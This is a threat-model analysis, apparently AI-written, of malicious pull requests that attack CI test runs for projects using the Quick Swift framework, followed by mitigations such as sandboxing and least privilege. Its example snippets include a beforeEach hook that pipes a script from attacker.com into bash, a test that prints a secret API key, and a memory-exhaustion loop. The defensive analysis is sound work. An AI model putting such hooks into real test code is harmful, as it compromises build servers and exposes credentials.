Okay, let's dive deep into analyzing the attack tree path "1.1.2. Submit Malicious Pull Request (if tests run on PRs)" in the context of an application using the Quick testing framework (https://github.com/quick/quick).

## Deep Analysis of Attack Tree Path 1.1.2: Submit Malicious Pull Request

### 1. Define Objective, Scope, and Methodology

**Objective:**

The primary objective of this deep analysis is to thoroughly understand the vulnerabilities, potential impacts, and effective mitigation strategies associated with an attacker submitting a malicious pull request (PR) that exploits the automated test execution environment of an application using Quick.  We aim to identify specific attack vectors, assess their likelihood and impact, and recommend concrete security controls to reduce the risk to an acceptable level.  We're particularly focused on scenarios where tests are automatically run on submitted PRs.

**Scope:**

This analysis focuses specifically on the following:

*   **Target Application:**  Any application utilizing the Quick testing framework for Swift or Objective-C.  The analysis assumes the application's development workflow includes automated test execution upon PR submission.
*   **Attacker Profile:**  An external attacker with the ability to submit pull requests to the application's repository (e.g., on GitHub, GitLab, Bitbucket).  The attacker may have varying levels of knowledge about the application's codebase and testing infrastructure.
*   **Attack Vector:**  Submission of a malicious pull request containing code changes designed to exploit vulnerabilities during the test execution phase.
*   **Exclusions:**  This analysis *does not* cover attacks that bypass the PR process (e.g., direct commits to protected branches, social engineering attacks to gain commit access).  It also doesn't cover vulnerabilities *within* the Quick framework itself, but rather how an attacker might misuse the framework's features or the testing environment.

**Methodology:**

We will employ a combination of the following techniques:

1.  **Threat Modeling:**  We will systematically identify potential threats related to malicious PRs and their impact on the application and its infrastructure.
2.  **Code Review (Hypothetical):**  We will analyze hypothetical code snippets (both in the application and in the malicious PR) to identify potential vulnerabilities and exploit techniques.
3.  **Vulnerability Analysis:**  We will examine common vulnerabilities that could be exploited during test execution, considering the specific context of Quick and the Swift/Objective-C ecosystem.
4.  **Best Practices Review:**  We will compare the application's (hypothetical) CI/CD pipeline and testing practices against industry best practices for secure development and testing.
5.  **Mitigation Recommendation:**  Based on the analysis, we will propose concrete, actionable mitigation strategies to reduce the identified risks.

### 2. Deep Analysis of the Attack Tree Path

**2.1. Threat Modeling and Attack Scenarios:**

Let's break down the threat and explore potential attack scenarios:

*   **Threat:** An attacker submits a malicious pull request that compromises the application or its infrastructure during automated test execution.
*   **Impact:**
    *   **Code Execution on CI/CD Server:**  The most severe impact.  The attacker gains the ability to execute arbitrary code on the server running the tests. This could lead to:
        *   **Data Breach:**  Access to sensitive data stored on the CI/CD server (e.g., API keys, database credentials, source code).
        *   **Infrastructure Compromise:**  Pivoting to other systems within the network.
        *   **Supply Chain Attack:**  Injecting malicious code into the application itself, which would then be distributed to users.
        *   **Denial of Service:**  Disrupting the CI/CD pipeline, preventing legitimate development.
    *   **Test Manipulation:**  The attacker modifies tests to pass despite underlying vulnerabilities in the application, leading to the deployment of insecure code.
    *   **Resource Exhaustion:**  The attacker submits a PR that causes the test suite to consume excessive resources (CPU, memory, disk space), potentially leading to a denial-of-service condition for the CI/CD pipeline.
    *   **Information Disclosure:**  The attacker crafts tests that leak sensitive information through error messages, logs, or test output.

*   **Attack Scenarios:**

    1.  **Exploiting `beforeEach` / `afterEach` Blocks:**  Quick's `beforeEach` and `afterEach` blocks are executed before and after each test example, respectively.  A malicious PR could inject code into these blocks that performs harmful actions.  For example:
        ```swift
        // Malicious PR
        beforeEach {
            // Attempt to execute a shell command
            let task = Process()
            task.launchPath = "/bin/sh"
            task.arguments = ["-c", "curl http://attacker.com/malware.sh | bash"]
            task.launch()
        }
        ```
        This code attempts to download and execute a shell script from an attacker-controlled server.

    2.  **Overriding System Calls:**  The attacker could use techniques like method swizzling (in Objective-C) or dynamic dispatch manipulation (in Swift) to override system calls used by the application or the testing framework.  This could allow them to intercept and modify file system operations, network requests, or other sensitive actions.

    3.  **Exploiting Test Dependencies:**  If the tests rely on external dependencies (e.g., mock servers, databases), the attacker could attempt to compromise these dependencies or provide malicious versions of them.  For example, if the tests use a mocked network library, the attacker could modify the mock to return malicious data or redirect network traffic.

    4.  **Resource Exhaustion (DoS):**  The attacker could create tests that consume excessive resources:
        ```swift
        // Malicious PR
        it("should cause a resource exhaustion") {
            var largeArray = [Int]()
            while true {
                largeArray.append(1)
            }
        }
        ```
        This creates an infinitely growing array, eventually leading to a memory exhaustion error.

    5.  **Information Disclosure via Test Output:**
        ```swift
        // Malicious PR
        it("should leak sensitive data") {
            let apiKey = ProcessInfo.processInfo.environment["SECRET_API_KEY"] ?? "No Key"
            print("API Key: \(apiKey)") // Leaks the key in the test output
            expect(true).to(beTrue())
        }
        ```
        This code attempts to read a sensitive environment variable and print it to the test output, which might be visible to the attacker.

    6.  **Exploiting Unsafe Code:** If the application or its tests use `unsafe` code blocks (e.g., for interacting with C libraries), the attacker could introduce memory corruption vulnerabilities or other low-level exploits.

    7.  **Manipulating Test Logic:** The attacker could subtly modify the test logic to make it pass even when the underlying code is vulnerable.  This could involve changing assertions, mocking out critical parts of the application, or disabling security checks.

**2.2. Vulnerability Analysis:**

The core vulnerability is the **untrusted execution of code from pull requests**.  Several factors contribute to the severity of this vulnerability:

*   **Automatic Test Execution:**  The automated nature of the test execution on PR submission creates a direct attack vector.
*   **Privileged Context:**  Tests often run with elevated privileges (e.g., access to environment variables, network resources, databases) that are not available to the application in its normal runtime environment.
*   **Complexity of Testing Frameworks:**  Testing frameworks like Quick provide powerful features that, if misused, can be exploited by attackers.
*   **Lack of Sandboxing (Often):**  Many CI/CD environments do not fully sandbox the test execution environment, allowing malicious code to interact with the host system.

**2.3. Best Practices Review (Hypothetical CI/CD Pipeline):**

A typical (but potentially insecure) CI/CD pipeline might look like this:

1.  Developer submits a pull request.
2.  GitHub Actions (or similar) triggers a workflow.
3.  The workflow checks out the code from the pull request.
4.  The workflow builds the application.
5.  The workflow runs the Quick test suite.
6.  If the tests pass, the PR is marked as "ready for review."

This pipeline is vulnerable because it executes untrusted code (from the PR) without sufficient isolation or security controls.

### 3. Mitigation Recommendations

To mitigate the risks associated with malicious pull requests, we recommend the following:

1.  **Sandboxing:**  **This is the most crucial mitigation.**  Run tests in a strictly isolated environment, such as:
    *   **Containers (Docker):**  Run each test suite in a separate Docker container with limited resources and network access.  Use a minimal base image and avoid mounting sensitive directories from the host.
    *   **Virtual Machines:**  Use virtual machines for even stronger isolation, although this can be more resource-intensive.
    *   **Dedicated Test Environments:**  Use separate, isolated infrastructure for running tests, distinct from production or development environments.

2.  **Least Privilege:**  Ensure that the test execution environment has the absolute minimum privileges necessary to run the tests.
    *   **Avoid Root Access:**  Do not run tests as the root user.
    *   **Restrict Network Access:**  Use firewall rules or network namespaces to limit network access from the test environment.  Only allow access to necessary resources (e.g., mock servers, test databases).
    *   **Limit Environment Variables:**  Carefully control which environment variables are exposed to the test environment.  Avoid exposing sensitive keys or credentials.

3.  **Code Review and Static Analysis:**
    *   **Mandatory Code Review:**  Require thorough code review of all pull requests, paying close attention to changes in test code and configuration.
    *   **Static Analysis Tools:**  Use static analysis tools (e.g., SwiftLint, SonarQube) to automatically detect potential security vulnerabilities in the code, including the test code.

4.  **Dependency Management:**
    *   **Pin Dependencies:**  Use a dependency manager (e.g., Swift Package Manager, CocoaPods) to pin dependencies to specific versions.  This prevents attackers from injecting malicious code through compromised dependencies.
    *   **Vulnerability Scanning:**  Regularly scan dependencies for known vulnerabilities.

5.  **Test Suite Design:**
    *   **Avoid Shell Commands:**  Minimize the use of shell commands within tests.  If necessary, use parameterized commands and carefully sanitize inputs.
    *   **Review `beforeEach` and `afterEach`:**  Scrutinize the code in `beforeEach` and `afterEach` blocks for potential security risks.
    *   **Don't Leak Secrets:**  Ensure that tests do not print or log sensitive information.

6.  **CI/CD Pipeline Configuration:**
    *   **Separate Build and Test Stages:**  Separate the build and test stages in the CI/CD pipeline.  This allows you to build the application in a more trusted environment and then run the tests in a more isolated environment.
    *   **Trigger Tests Manually (Optional):**  For high-risk projects, consider requiring manual approval before running tests on a pull request.  This adds an extra layer of review but can slow down the development process.
    *   **Monitor Test Execution:**  Monitor test execution for unusual behavior, such as excessive resource consumption or unexpected network connections.

7.  **Security Training:**  Provide security training to developers on secure coding practices and the risks associated with malicious pull requests.

8. **Regular expression filtering**: Before running tests, filter code for dangerous functions and patterns.

By implementing these mitigation strategies, you can significantly reduce the risk of an attacker exploiting your application's testing environment through malicious pull requests.  The most important step is to **sandbox the test execution environment** to prevent attackers from gaining access to your infrastructure or sensitive data.
